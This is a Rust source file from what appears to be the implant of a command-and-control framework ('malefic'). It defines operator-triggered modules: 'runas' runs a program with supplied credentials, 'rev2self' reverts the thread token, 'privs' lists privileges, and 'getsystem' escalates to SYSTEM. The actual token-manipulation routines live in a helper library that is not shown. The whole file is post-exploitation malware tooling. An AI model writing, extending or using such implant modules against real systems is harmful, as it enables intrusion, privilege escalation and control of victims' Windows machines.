use crate::{check_field, check_request, Input, Module, ModuleImpl, Output, Result, TaskResult};
use malefic_proto::proto::implantpb::{spite::Body};
use async_trait::async_trait;
use malefic_proto::proto::implantpb::spite::Body::ExecResponse;
use malefic_trait::module_impl;


pub struct RunAs {}

#[async_trait]
#[module_impl("runas")]
impl Module for RunAs {}

#[async_trait]
impl ModuleImpl for RunAs {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
        let req = check_request!(receiver, Body::RunasRequest)?;

        let username = check_field!(req.username)?;
        let domain = check_field!(req.domain)?;
        let password = check_field!(req.password)?;
        let program = check_field!(req.program)?;
        let args = check_field!(req.args)?;

        let mut exec_response = malefic_proto::proto::modulepb::ExecResponse::default();
        exec_response.stdout = malefic_helper::win::token::run_as(&username, &domain, &password, &program, &args, req.netonly, req.use_profile, req.use_env)?.into_bytes();
        Ok(TaskResult::new_with_body(
            id,
            ExecResponse(exec_response),
        ))
    }
}


pub struct Rev2Self {}

#[async_trait]
#[module_impl("rev2self")]
impl Module for Rev2Self {}


#[async_trait]
impl ModuleImpl for Rev2Self {
    async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> Result {
        malefic_helper::win::token::revert_to_self()?;
        Ok(TaskResult::new(id))
    }
}

pub struct GetPriv {}

#[async_trait]
#[module_impl("privs")]
impl Module for GetPriv {}
#[async_trait]
impl ModuleImpl for GetPriv {
    async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> Result {
        let privileges = malefic_helper::win::token::get_privs()?;

        let mut response = malefic_proto::proto::modulepb::Response::default();

        for (name, display_name) in privileges {
            response.kv.insert(name, display_name);
        }

        Ok(TaskResult::new_with_body(id, Body::Response(response)))
    }
}


pub struct GetSystem {}

#[async_trait]
#[module_impl("getsystem")]
impl Module for GetSystem {}

#[async_trait]
impl ModuleImpl for GetSystem {
    async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> Result {
        // 尝试提升到 SYSTEM 权限
        let _system_token = malefic_helper::win::token::get_system()?;

        let mut response = malefic_proto::proto::modulepb::Response::default();
        response.output = "Successfully elevated to SYSTEM privileges".to_string();

        Ok(TaskResult::new_with_body(id, Body::Response(response)))
    }
}